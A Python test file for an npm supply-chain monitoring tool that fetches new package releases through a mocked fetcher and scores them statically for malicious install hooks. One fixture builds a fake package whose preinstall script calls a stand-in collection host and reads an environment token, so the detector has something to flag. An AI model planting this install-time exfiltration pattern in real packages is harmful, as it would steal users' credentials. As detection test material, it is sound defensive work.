import io
import json
import tarfile
from pathlib import Path

import soc_store
from secopsai.research_npm_enrichment import run_npm_enrichment_cycle
from secopsai.research_surveillance import ensure_collectors
from secopsai.research_scoring import score_pending_events
from secopsai.research_intake import SafeFetcher


def _tarball(*, package: str, version: str, malicious: bool) -> bytes:
    package_json = {
        "name": package,
        "version": version,
        "scripts": {"preinstall": "node setup.js"} if malicious else {},
    }
    setup = (
        "const cp = require('child_process');\n"
        "fetch('https://example.invalid/collect');\n"
        "const token = process.env.TOKEN;\n"
    ) if malicious else "module.exports = true;\n"
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name, content in (
            ("package/package.json", json.dumps(package_json).encode()),
            ("package/setup.js", setup.encode()),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    return buffer.getvalue()


def _event(db: str, package: str, seq: int) -> None:
    now = soc_store.utc_now()
    with soc_store.connect(db) as connection:
        connection.execute(
            """INSERT INTO registry_feed_events
               (feed_event_id, collector_id, ecosystem, package, version, event_type,
                registry_timestamp, page_url, leaf_url, leaf_fetched, metadata_json,
                idempotency_key, collected_at, processing_state)
               VALUES (?, 'COL-NPM-CHANGES', 'npm', ?, '', 'published', ?, ?, ?, 0, ?, ?, ?, 'pending')""",
            (
                f"RFE-TEST-{seq}",
                package,
                now,
                "https://replicate.npmjs.com/_changes",
                f"https://registry.npmjs.org/{package}",
                json.dumps({"seq": seq}),
                f"npm-test-{package}-{seq}",
                now,
            ),
        )
        connection.commit()


def test_npm_enrichment_resolves_exact_version_and_inspects_new_lifecycle_release(tmp_path, monkeypatch):
    db = str(tmp_path / "research.db")
    quarantine = tmp_path / "quarantine"
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(quarantine))
    ensure_collectors(db_path=db)
    package = "example-package"
    state = {"version": "1.0.0", "malicious": False}

    def fetch(url, max_bytes):
        if url.endswith(".tgz"):
            return 200, {"content-type": "application/gzip"}, _tarball(package=package, version=state["version"], malicious=state["malicious"])
        if url.startswith("https://registry.npmjs.org/"):
            version = state["version"]
            item = {
                "name": package,
                "version": version,
                "scripts": {"preinstall": "node setup.js"} if state["malicious"] else {},
                "dist": {
                    "tarball": f"https://registry.npmjs.org/{package}/-/{package}-{version}.tgz",
                    "integrity": "sha512-test",
                    "shasum": "test-sha",
                },
                "author": {"name": "Example Maintainer"},
                "dependencies": {},
            }
            payload = {
                "name": package,
                "dist-tags": {"latest": version},
                "time": {version: "2026-08-04T19:00:00.000Z"},
                "versions": {version: item},
            }
            return 200, {"content-type": "application/json"}, json.dumps(payload).encode()
        raise AssertionError(url)

    _event(db, package, 1)
    baseline = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fetch))
    assert baseline["packages_fetched"] == 1
    assert baseline["versions_created"] == 1
    score_pending_events(db_path=db, limit=50)

    state.update(version="1.1.0", malicious=True)
    _event(db, package, 2)
    result = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fetch))
    assert result["versions_created"] == 1
    assert result["static"]["analyses_started"] == 1
    assert result["static"]["candidates_created"] == 1

    with soc_store.connect(db) as connection:
        exact = connection.execute(
            "SELECT version, event_type, processing_state FROM registry_feed_events WHERE package=? AND version<>'' ORDER BY version",
            (package,),
        ).fetchall()
        analysis = connection.execute(
            "SELECT status, score, intake_json FROM research_npm_release_analyses WHERE package=? AND version='1.1.0'",
            (package,),
        ).fetchone()
        candidate = connection.execute(
            "SELECT package, version, reference_identifier, evidence_json FROM research_candidates WHERE package=? AND version='1.1.0'",
            (package,),
        ).fetchone()
        alert = connection.execute(
            "SELECT alert_type, severity FROM research_alerts WHERE alert_type='npm_proactive_anomaly'"
        ).fetchone()

    assert [(row["version"], row["event_type"]) for row in exact] == [
        ("1.0.0", "version_observed"),
        ("1.1.0", "version_updated"),
    ]
    assert analysis["status"] == "completed"
    assert int(analysis["score"]) >= 40
    intake = json.loads(analysis["intake_json"])
    assert intake["artifact_sha256"]
    assert intake["execution_performed"] is False
    assert candidate["reference_identifier"] == "npm-proactive-static.v1"
    evidence = json.loads(candidate["evidence_json"])
    assert evidence["validation_state"] == "static_confirmed"
    assert evidence["analysis"]["execution_performed"] is False
    assert alert["alert_type"] == "npm_proactive_anomaly"
    assert alert["severity"] in {"high", "critical"}


def test_npm_enrichment_keeps_registry_failures_visible_and_retryable(tmp_path):
    db = str(tmp_path / "research.db")
    ensure_collectors(db_path=db)
    _event(db, "unavailable-package", 1)

    def fail(_url, _max_bytes):
        return 503, {"content-type": "text/plain"}, b"temporary outage"

    result = run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fail))
    assert result["failures"] == 1
    with soc_store.connect(db) as connection:
        row = connection.execute(
            "SELECT processing_state, metadata_json FROM registry_feed_events WHERE package='unavailable-package'"
        ).fetchone()
    assert row["processing_state"] == "enrichment_failed"
    metadata = json.loads(row["metadata_json"])
    assert metadata["npm_enrichment_status"] == "failed"
    assert "registry returned HTTP 503" in metadata["npm_enrichment_error"]


def _indicators(*ids):
    return [{"indicator_id": item, "observation_fingerprint": item} for item in ids]


def test_generic_capabilities_without_install_hook_stay_below_review_threshold():
    from secopsai.research_npm_enrichment import _artifact_score

    # Typical benign SDK bundle: URLs, eval, child_process, "token" strings.
    score, signals = _artifact_score({
        "indicators": _indicators("network-endpoint", "dynamic-eval", "credential-access", "process-execution"),
        "lifecycle_scripts": {},
        "expanded_bytes": 400 * 1024,
    })
    assert score < 50
    assert not any(signal["id"].startswith("chain_") for signal in signals)


def test_install_time_credential_egress_chain_scores_critical_range():
    from secopsai.research_npm_enrichment import _artifact_score

    score, signals = _artifact_score({
        "indicators": _indicators("install-hook", "process-execution", "network-endpoint", "credential-access", "encoded-payload"),
        "lifecycle_scripts": {"postinstall": "node setup.js"},
        "expanded_bytes": 8 * 1024,
    })
    ids = {signal["id"] for signal in signals}
    assert {"chain_install_time_execution", "chain_install_time_credential_egress"} <= ids
    assert score >= 85


def test_metadata_and_artifact_evidence_corroborate():
    from secopsai.research_npm_enrichment import _combine_scores

    assert _combine_scores(50, 20) == (50, [])
    score, extra = _combine_scores(50, 40)
    assert score == 65 and extra[0]["id"] == "metadata_and_artifact_corroborate"


def test_exhausted_events_leave_the_queue_so_new_releases_are_processed(tmp_path):
    # Regression: 100 events that hit the retry cap filled the oldest-first
    # selection window forever and starved every newer release for weeks.
    from secopsai import research_npm_enrichment as enrichment

    db = str(tmp_path / "research.db")
    ensure_collectors(db_path=db)
    _event(db, "huge-package", 1)
    _event(db, "fresh-package", 2)
    with soc_store.connect(db) as connection:
        connection.execute(
            "UPDATE registry_feed_events SET processing_state='enrichment_failed', metadata_json=? WHERE package='huge-package'",
            (json.dumps({"npm_enrichment_attempts": enrichment.MAX_ATTEMPTS, "npm_enrichment_error": "registry response exceeded the safety limit"}),),
        )
        connection.commit()
    fetched = []

    def fetch(url, _max_bytes):
        fetched.append(url)
        return 503, {"content-type": "text/plain"}, b"down"

    run_npm_enrichment_cycle(db_path=db, fetcher=SafeFetcher(fetch=fetch), event_limit=2)
    with soc_store.connect(db) as connection:
        states = dict(connection.execute("SELECT package, processing_state FROM registry_feed_events").fetchall())
        meta = json.loads(connection.execute("SELECT metadata_json FROM registry_feed_events WHERE package='huge-package'").fetchone()[0])
    assert states["huge-package"] == "ignored"
    assert any("fresh-package" in url for url in fetched), "newer release was starved"
    assert meta["npm_enrichment_skip_reason"] == "packument_exceeds_safety_limit"


def test_stale_pending_events_expire(tmp_path):
    from secopsai.research_npm_enrichment import expire_stale_pending

    db = str(tmp_path / "research.db")
    ensure_collectors(db_path=db)
    _event(db, "old-package", 1)
    _event(db, "new-package", 2)
    with soc_store.connect(db) as connection:
        connection.execute("UPDATE registry_feed_events SET registry_timestamp='2020-01-01T00:00:00Z' WHERE package='old-package'")
        connection.commit()
    assert expire_stale_pending(db_path=db) == 1
    with soc_store.connect(db) as connection:
        states = dict(connection.execute("SELECT package, processing_state FROM registry_feed_events").fetchall())
    assert states == {"old-package": "ignored", "new-package": "pending"}


def test_static_triage_spends_downloads_on_the_most_suspicious_release(tmp_path, monkeypatch):
    from secopsai import research_npm_enrichment as enrichment

    db = str(tmp_path / "research.db")
    ensure_collectors(db_path=db)
    now = soc_store.utc_now()
    with soc_store.connect(db) as connection:
        for seq, (package, scripts) in enumerate((("hooked-package", {"postinstall": "node x.js"}), ("plain-package", {}), ("plain-package-2", {}))):
            connection.execute(
                """INSERT INTO registry_feed_events
                   (feed_event_id, collector_id, ecosystem, package, version, event_type, registry_timestamp, page_url,
                    leaf_url, leaf_fetched, metadata_json, idempotency_key, collected_at, processing_state)
                   VALUES (?, 'COL-NPM-CHANGES', 'npm', ?, '1.0.1', 'published', ?, 'u', 'u', 0, ?, ?, ?, 'pending')""",
                (f"RFE-RANK-{seq}", package, now, json.dumps({"version_summary": {"lifecycle_scripts": scripts}, "previous_version": "1.0.0"}), f"rank-{seq}", now),
            )
        connection.commit()
    analysed = []
    monkeypatch.setattr(enrichment, "collect_package_intake", lambda **kw: analysed.append(kw["package"]) or (_ for _ in ()).throw(RuntimeError("offline")))
    enrichment._run_static_triage(db_path=db, fetcher=SafeFetcher(fetch=lambda *_: (503, {}, b"")), limit=1)
    assert analysed == ["hooked-package"]
